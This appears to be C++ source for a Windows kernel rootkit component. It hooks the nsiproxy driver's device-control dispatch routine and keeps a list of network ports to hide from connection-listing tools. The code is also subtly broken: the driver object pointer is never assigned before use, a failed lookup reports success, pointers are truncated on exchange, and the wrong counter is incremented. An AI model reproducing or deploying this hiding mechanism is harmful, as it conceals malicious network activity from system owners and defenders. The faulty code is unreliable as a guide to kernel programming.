#include "NetworkHandler.h"

PDRIVER_OBJECT NetworkHandler::pNsiDriverObject = nullptr;
PDRIVER_DISPATCH NetworkHandler::originalNsiDeviceIo = nullptr;
NetworkHandler::HiddenPorts HiddenPortsContext;

NTSTATUS NetworkHandler::hookNsi()
{
	NTSTATUS status;
	UNICODE_STRING nsiDriverName;


	RtlInitUnicodeString(&nsiDriverName, L"\\Driver\\nsiproxy");

	status = ObReferenceObjectByName(&nsiDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, reinterpret_cast<PVOID*>(&originalNsiDeviceIo));

	if (!NT_SUCCESS(status))
	{
		KdPrint(("NetworkHandler: Failed to obtain nsiproxy object (0x%08X)\n", status));
		return STATUS_SUCCESS;

	}

	//Initialize hidden ports context
	HiddenPortsContext.Mutex.Init();
	HiddenPortsContext.HiddenPortsCount = 0;
	InitializeListHead(&HiddenPortsContext.HiddenPortsHead);


	//Save the original device control function of the nsiproxy driver
	originalNsiDeviceIo = pNsiDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];

	//Perform IRP hook
	InterlockedExchange(reinterpret_cast<PLONG>(&(pNsiDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL])), reinterpret_cast<LONG>(hookedDeviceIoControl));

	return status;
}

NTSTATUS NetworkHandler::unhookNsi() {

	//Undo hook
	InterlockedExchange(reinterpret_cast<PLONG>(&(pNsiDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL])), reinterpret_cast<LONG>(originalNsiDeviceIo));
	KdPrint(("NetworkHandler: original DeviceControl function restored \n"));

	//Decrease reference count of hooked driver
	ObDereferenceObject(pNsiDriverObject);

	//Sleep after removing IRP hooks
	//to make sure all handlers are done
	LARGE_INTEGER wait_time;
	wait_time.QuadPart = -50 * 1000 * 1000;
	KeDelayExecutionThread(KernelMode, 0, &wait_time);

	//Free the hidden ports list
	cleanHiddenPorts();

	return STATUS_SUCCESS;
}

//TODO: Create a remove hidden port function because of the code replication between cleanHiddenPorts and addHiddenPort.
void NetworkHandler::cleanHiddenPorts() {
	// Free list
	while (!IsListEmpty(&HiddenPortsContext.HiddenPortsHead)) {
		auto entry = RemoveHeadList(&HiddenPortsContext.HiddenPortsHead);
		auto item = CONTAINING_RECORD(entry, HiddenPort, Entry);
		//RtlFreeUnicodeString(&item->HiddenPort);
		ExFreePool(item);
	}
}

void NetworkHandler::addHiddenPort(LIST_ENTRY* entry) {
	
	AutoLock<FastMutex> lock(HiddenPortsContext.Mutex);
	if (HiddenPortsContext.HiddenPortsCount > MAX_HIDDEN_PORTS) {
		// Too many items, remove oldest one
		auto head = RemoveHeadList(&HiddenPortsContext.HiddenPortsHead);
		HiddenPortsContext.HiddenPortsCount--;
		auto item = CONTAINING_RECORD(head, HiddenPort, Entry);
		//RtlFreeUnicodeString(&item->ProcessPath);
		ExFreePool(item);
	}
	InsertTailList(&HiddenPortsContext.HiddenPortsHead, entry);
	HiddenPortsContext.ForbiddenProcessesCount++;
}